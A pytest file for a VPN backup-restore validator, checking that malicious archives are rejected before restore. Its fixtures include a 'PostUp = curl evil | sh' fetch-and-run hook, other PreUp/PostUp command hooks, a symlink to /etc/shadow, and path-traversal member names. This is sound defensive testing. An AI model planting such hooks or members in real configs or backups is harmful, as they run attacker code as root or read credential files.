"""Restore validation: a backup must not be able to run code on the entry.

awg-quick executes PreUp/PostUp/... from awg0.conf as root, age gives no
authenticity and the recipient is public, so a holder of the S3 writer key
could plant such a backup. Only plain files at the archive root and an
allow-listed awg0.conf are accepted.
"""
import io
import sys
import tarfile

import pytest

from test_render import ROOT

sys.path.insert(0, str(ROOT / "plugins" / "filter"))
import backup  # noqa: E402

PORT = 51820
SUBNET = "10.8.1.0/24"
CONF = """[Interface]
PrivateKey = cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MDA=
Address = 10.8.1.1/24
ListenPort = 51820
Jc = 5
Jmin = 10
Jmax = 50
S1 = 12
S2 = 12
S3 = 12
S4 = 12
H1 = 1
H2 = 2
H3 = 3
H4 = 4
HeaderProtectionKey = aGVhZGVy
RekeyAfterTime = 100-120
RandomTrailers = on
# I1 = <r 2><b 0x8580>
# I2 =

[Peer]
PublicKey = cGVlcnB1YmxpY2tleXBlZXJwdWJsaWNrZXlwZWVyMDA=
PresharedKey = cHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrMDA=
AllowedIPs = 10.8.1.2/32
"""


def _tar(path, members=None, conf=CONF, extra=()):
    """members: list of (name, kind, data); default: a valid backup."""
    if members is None:
        members = [(".", "dir", None), ("./awg0.conf", "file", conf),
                   ("./wireguard_server_private_key.key", "file", "K\n"),
                   ("./clientsTable", "file", "[]\n")]
    members = list(members) + list(extra)
    with tarfile.open(path, "w") as tar:
        for name, kind, data in members:
            info = tarfile.TarInfo(name)
            raw = data.encode() if isinstance(data, str) else (data or b"")
            if kind == "file":
                info.size = len(raw)
                tar.addfile(info, io.BytesIO(raw))
                continue
            info.type = {"dir": tarfile.DIRTYPE, "symlink": tarfile.SYMTYPE,
                         "hardlink": tarfile.LNKTYPE, "chr": tarfile.CHRTYPE,
                         "fifo": tarfile.FIFOTYPE}[kind]
            if kind in ("symlink", "hardlink"):
                info.linkname = data
            tar.addfile(info)
    return str(path)


def _problems(tmp_path, **kw):
    return backup.backup_archive_problems(_tar(tmp_path / "b.tar", **kw), PORT, SUBNET)


def test_valid_backup_passes(tmp_path):
    assert _problems(tmp_path) == []


def test_app_style_network_address_passes(tmp_path):
    # The Amnezia app writes the network address itself (10.8.1.0/24).
    assert _problems(tmp_path, conf=CONF.replace("10.8.1.1/24", "10.8.1.0/24")) == []


@pytest.mark.parametrize("kind,data", [("symlink", "/etc/shadow"), ("hardlink", "./awg0.conf"),
                                       ("chr", None), ("fifo", None)])
def test_non_regular_members_are_refused(tmp_path, kind, data):
    probs = _problems(tmp_path, extra=[("./evil", kind, data)])
    assert any("./evil" in p and "regular file" in p for p in probs), probs


@pytest.mark.parametrize("name", ["./sub/awg0.conf", "sub", "../x", "/etc/cron.d/x", "./"])
def test_members_outside_the_archive_root_are_refused(tmp_path, name):
    kind = "dir" if name in ("sub", "./") else "file"
    probs = _problems(tmp_path, extra=[(name, kind, "x")])
    assert probs and any(name.strip("/") in p or "duplicate" in p or "root" in p for p in probs), probs


def test_duplicate_members_are_refused(tmp_path):
    probs = _problems(tmp_path, extra=[("./awg0.conf", "file", CONF + "PostUp = id\n")])
    assert any("duplicate" in p for p in probs), probs


@pytest.mark.parametrize("line", [
    "PostUp = curl evil | sh", "PreUp = id", "PostDown = id", "PreDown = id",
    "SaveConfig = true", "Table = off", "DNS = 1.1.1.1", "FwMark = 0x1", "Bogus = 1"])
def test_interface_keys_outside_the_allow_list_are_refused(tmp_path, line):
    conf = CONF.replace("ListenPort = 51820\n", f"ListenPort = 51820\n{line}\n")
    probs = _problems(tmp_path, conf=conf)
    key = line.split("=")[0].strip()
    assert any(f"'{key}'" in p for p in probs), probs


def test_lower_case_and_trailing_comment_do_not_bypass(tmp_path):
    conf = CONF.replace("ListenPort = 51820\n", "ListenPort = 51820\n  postup=id # comment\n")
    assert any("'postup'" in p for p in _problems(tmp_path, conf=conf))


def test_peer_keys_outside_the_allow_list_are_refused(tmp_path):
    probs = _problems(tmp_path, conf=CONF + "PostUp = id\n")
    assert any("'PostUp'" in p and "[Peer]" in p for p in probs), probs


@pytest.mark.parametrize("conf,needle", [
    ("Address = 10.8.1.1/24\n" + CONF, "outside a section"),
    (CONF.replace("[Peer]", "[peer]"), "section"),
    (CONF.replace("Jc = 5\n", "Jc 5\n"), "not a 'Key = value' line"),
    (CONF.replace("ListenPort = 51820", "ListenPort = 40000"), "ListenPort 40000"),
    (CONF.replace("ListenPort = 51820\n", ""), "ListenPort"),
    (CONF.replace("10.8.1.1/24", "10.9.9.1/24"), "Address 10.9.9.1/24"),
    (CONF.replace("Address = 10.8.1.1/24\n", ""), "Address"),
])
def test_structure_port_and_subnet(tmp_path, conf, needle):
    probs = _problems(tmp_path, conf=conf)
    assert any(needle in p for p in probs), probs


def test_required_files_and_text(tmp_path):
    probs = _problems(tmp_path, members=[(".", "dir", None), ("./awg0.conf", "file", b"\xff\xfe")])
    assert any("wireguard_server_private_key.key" in p for p in probs), probs
    assert any("UTF-8" in p for p in probs), probs
